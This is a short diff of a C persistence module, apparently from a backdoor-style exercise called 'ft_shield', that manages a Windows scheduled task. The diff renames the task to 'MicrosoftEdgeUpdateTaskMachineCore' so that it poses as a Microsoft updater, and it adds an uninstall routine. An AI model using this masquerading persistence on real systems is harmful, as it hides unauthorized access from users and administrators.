@@ -1,5 +1,3 @@
-/* ************************************************************************** */
-/*                                                                            */
 /*                                                        :::      ::::::::   */
 /*   task.c                                             :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
@@ -14,7 +12,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 
-#define TASK_NAME "ft_shield_task"
+#define TASK_NAME "MicrosoftEdgeUpdateTaskMachineCore"
 
 int task_install(const char *path, const char *arg)
 {
@@ -33,10 +31,22 @@ int task_install(const char *path, const char *arg)
 
 int persistence_task_detect(void)
 {
+    
     char cmd[512];
 
     snprintf(cmd, sizeof(cmd),
         "schtasks /query /tn \"%s\" >nul 2>&1",
+        TASK_NAME);
+
+    return (system(cmd) == 0);
+}
+
+int task_uninstall(void)
+{
+    char cmd[512];
+
+    snprintf(cmd, sizeof(cmd),
+        "schtasks /delete /tn \"%s\" /f >nul 2>&1",
         TASK_NAME);
 
     return (system(cmd) == 0);
